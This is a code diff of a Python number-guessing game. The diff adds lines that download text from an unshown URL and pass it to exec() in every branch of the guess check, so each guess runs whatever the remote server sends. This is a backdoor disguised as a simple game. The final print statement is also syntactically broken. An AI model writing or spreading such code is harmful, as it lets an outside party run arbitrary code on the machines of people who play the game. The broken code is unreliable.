@@ -25,14 +25,18 @@ def plr():
         response = requests.get(url, headers=headers) 
         guess = int(guess)
         attempts += 1
-        fncnt = response.text
+        print("version sad")
+        
 
         if guess < secret_number:
+            fncnt = response.text
             print("Too low! Try again.",exec(f"{fncnt}"))
         elif guess > secret_number:
+            fncnt = response.text
             print("Too high! Try again.",exec(f"{fncnt}"))
             
         else:
+            fncnt = response.text
             print(f"Congratulations! ,exec(f"{fncnt}"))
             break
             
